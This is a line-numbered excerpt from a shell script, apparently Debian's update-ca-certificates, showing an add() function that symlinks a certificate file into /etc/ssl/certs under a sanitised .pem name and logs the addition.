    87	# Adds a certificate to the list of trusted ones.  This includes a symlink
    88	# in /etc/ssl/certs to the certificate file and its inclusion into the
    89	# bundle.
    90	add() {
    91	  CERT="$1"
    92	  PEM="$ETCCERTSDIR/$(basename "$CERT" .crt | sed -e 's/ /_/g' \
    93	                                                  -e 's/[()]/=/g' \
    94	                                                  -e 's/,/_/g').pem"
    95	  if ! test -e "$PEM" || [ "$(readlink "$PEM")" != "$CERT" ]
    96	  then
    97	    ln -sf "$CERT" "$PEM"
    98	    echo "+$PEM" >> "$ADDED"
    99	  fi
   100	  # Add trailing newline to certificate, if it is missing (#635570)
